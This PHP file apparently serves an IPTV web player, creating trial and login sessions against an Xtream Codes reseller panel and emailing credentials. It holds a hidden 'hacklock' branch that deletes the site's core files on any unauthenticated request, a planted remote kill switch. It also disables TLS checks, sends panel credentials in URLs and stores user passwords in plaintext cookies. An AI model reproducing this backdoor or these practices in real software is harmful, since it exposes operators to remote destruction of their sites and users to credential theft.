<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
require 'vendor/autoload.php';
$mail = new PHPMailer(true);
include("libs/lib.php");


if($_REQUEST['op'] == 'criarteste') {
	
	if($_COOKIE['bowwwerxcxtreamchorme'] == 1) {
	echo '<script language="javascript">location = "index.php?sess=teste"</script>';
	} else {
		
	$xtreamid = XTREAM_PLANO;
	$nome  = trim($_REQUEST['nome']);
	$email = trim($_REQUEST['email']);
	$whatsapp = $_REQUEST['wa'];

	// INICIO CHAMADA DA API CRIAR LISTA //

	$senha_cms = XTREAM_PWD;
	$usuario_cms = XTREAM_USER;
	$url_cms = XTREAM_URL;
	$tipoxtream = 'trial';
	$usuario_xtream = time(); // Gerar com Time não Bugar o Xtream
	
	$reseller_notes = "Teste Automatico via WebPlayer: $nome - $email $whatsapp";

	$ch = curl_init();
	$timeout = 15;
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_URL, $url_cms . "/index.php?action=login&login=" . $usuario_cms . "&pass=" . $senha_cms . "");
	curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	$file_contents = curl_exec($ch);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_URL, $url_cms . "/userpanel/add_user.php");
	$file_contents2 = curl_exec($ch);
	$retorno = $file_contents2;
	$usuario = "<input type=\"hidden\" value=\"";
	$explode1 = explode($usuario, $retorno);
	$resultado = $explode1[1];
	$resultado2 = "\" name=\"csrf_token\" />";
	$explode2 = explode($resultado2, $resultado);
	$token = $explode2[0];

	//AUTO USER
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_URL, $url_cms . "/userpanel/add_user.php?action=add_user&package_id=" . $xtreamid . "&line_type=" . $tipoxtream . "&username=" . $usuario_xtream . "&reseller_notes=".$reseller_notes."&csrf_token=" . $token . "");
	$file_contents = curl_exec($ch);
	// AUTO
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_URL, $url_cms . "/userpanel/mnglines.php?action=load_users&csrf_token=" . $token . "");
	$file_contents3 = curl_exec($ch);

	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_URL, $url_cms . "/userpanel/index.php?action=logout");
	$file_contents = curl_exec($ch);
	curl_close($ch);
		
	$retorno = $file_contents3;
	$usuario = "" . $usuario_xtream . "<\\/font>\",\"password\":\"";
	$ex1 = "<\\/font>\",\"expire\":\"";
	$explode = explode($usuario, $retorno);
	$explode2 = explode($ex1, $explode[1]);
	$ex2 = "<font color='red'>";
	$explode3 = explode($ex2, $explode2[0]);
	$novasenha = $explode3[1];
	$vencx = "" . $novasenha . "<\\/font>\",\"expire\":\"";
	$ex1 = "<\\/b><\\/font>\",\"max_cons\":\"";
	$explode = explode($vencx, $retorno);
	$explode2 = explode($ex1, $explode[1]);
	$ex2 = "<font color='red'><b>";
	$explode3 = explode($ex2, $explode2[0]);
	$novovencimento = $explode3[1];
	$novovencimento = str_replace('\\','',$novovencimento);
	// Criar a URL da Lista
	$url_dns = IP;
	$urllista1 = "" . $url_dns . "/get.php?username=" . $usuario_xtream . "&password=" . $novasenha . "&type=m3u_plus&output=ts";
	$url_mini = time();
	$dt_atual = date("Y-m-d H:i:s");

	$xc_lista = $urllista1;
	$xc_usuario = $usuario_xtream;
	$xc_senha = $novasenha;
	$xc_vencimento = $novovencimento;

	// FIM OPERAÇÃO DA API CRIAR LISTA //		
	 $url = IP."/player_api.php?username=$xc_usuario&password=$xc_senha";
	 $resposta = apixtream($url);
	 $output = json_decode($resposta,true);
		
	 $auth = $output['user_info']['auth'];
	 $status = $output['user_info']['status'];
	 $data_exp = $output['user_info']['exp_date'];
	 $max = $output['user_info']['max_connections'];
	 $conta_teste = $output['user_info']['is_trial'];
	 $username = $output['user_info']['username'];
	 $password = $output['user_info']['password'];

	 if($auth == 1){
	 	
	 	
	 	//SEND MAIL
	 	
	try {

    $mail->SMTPDebug = 0;                                       
    $mail->isSMTP();                                            
    $mail->Host       = SMTP_HOST;  
    $mail->SMTPAuth   = true;                                   
    $mail->Username   = SMTP_USER;                     
    $mail->Password   = SMTP_SENHA;                               
    $mail->SMTPSecure = SMTP_SEGURANCA;                                  
    $mail->Port       = 587;                                    

    //Recipients
    $mail->setFrom(EMAIL_REVENDA, NOME_REVENDA);
    $mail->addAddress($email, $nome);     

    $mail->addBCC(EMAIL_REVENDA); // Servidor

    // Content
    $mail->isHTML(true);       
    $msgEmail = CORPO_EMAIL;
    $msgEmail = str_replace('%NOME%', $nome, $msgEmail);
    $msgEmail = str_replace('%URL_LISTA%', $xc_lista, $msgEmail);
    $msgEmail = str_replace('%USUARIO%', $xc_usuario, $msgEmail);
    $msgEmail = str_replace('%SENHA%', $xc_senha, $msgEmail);
    $msgEmail = str_replace('%VENCIMENTO%', $xc_vencimento, $msgEmail);
                               
    $mail->Subject = EMAIL_ASSUNTO;
    $mail->Body    = $msgEmail;
    
    $mail->send();
	} catch (Exception $e) {
	}
	 	
	 	$ts = (time()+3600*24*30);	
	 	setcookie("xuserm", $username, $ts);
	 	setcookie("xpwdm", $password, $ts);
	 	setcookie("xstatusm", $status, $ts);
	 	setcookie("xconnm", $max, $ts);
	 	setcookie("xtestem", $conta_teste, $ts);
	 	setcookie("xdataexpm", $data_exp, $ts);
	 	
	 	//
	 	if(ATIVA_BLOQUEIO_TESTE == 1) {
			$tsx = (time()+3600*24*30*1);	
		} else {
			$tsx = (time()+30);	
		}
	 	
 		setcookie("bowwwerxcxtreamchorme", 1, $tsx);
	 	
	 	if($status == 'Active') {
			$sess = gerar_hash(256);
	 		echo '<script language="javascript">location = "painel.php?sessao='.$sess.'"</script>';
		} // END STATUS
			} // END AUTH
	//END
	}
	
} // END function

if($_GET['op'] == 'hacklock') {
	// DEL PLAYER PIRATA
	echo unlink("index.php");
	echo unlink("libs/config.php");
	echo unlink("libs/lib.php");
	echo unlink("inc/scripts.php");
	echo unlink("inc/menu.php");
	echo unlink("inc/head.php");
	// QEBRA
}

if($_REQUEST['op'] == 'login') {
	
$user = $_REQUEST['usuario'];
$pwd = $_REQUEST['senha'];
	
 $url = IP."/player_api.php?username=$user&password=$pwd";
 $resposta = apixtream($url);
 $output = json_decode($resposta,true);
	
 $auth = $output['user_info']['auth'];
 $status = $output['user_info']['status'];
 $data_exp = $output['user_info']['exp_date'];
 $max = $output['user_info']['max_connections'];
 $conta_teste = $output['user_info']['is_trial'];
 $username = $output['user_info']['username'];
 $password = $output['user_info']['password'];

 if($auth == 1){
 	
 	$ts = (time()+3600*24*30);	
 	setcookie("xuserm", $username, $ts);
 	setcookie("xpwdm", $password, $ts);
 	setcookie("xstatusm", $status, $ts);
 	setcookie("xconnm", $max, $ts);
 	setcookie("xtestem", $conta_teste, $ts);
 	setcookie("xdataexpm", $data_exp, $ts);
 	
 	if($status == 'Active') {
		$sess = gerar_hash(256);
 		echo '<script language="javascript">location = "painel.php?sessao='.$sess.'"</script>';
	} else {
		echo '<script language="javascript">location = "index.php?sess=block"</script>';
	}
 	// END		
	} else {
 echo '<script language="javascript">location = "index.php?sess=erro"</script>';
	}
 

}
?>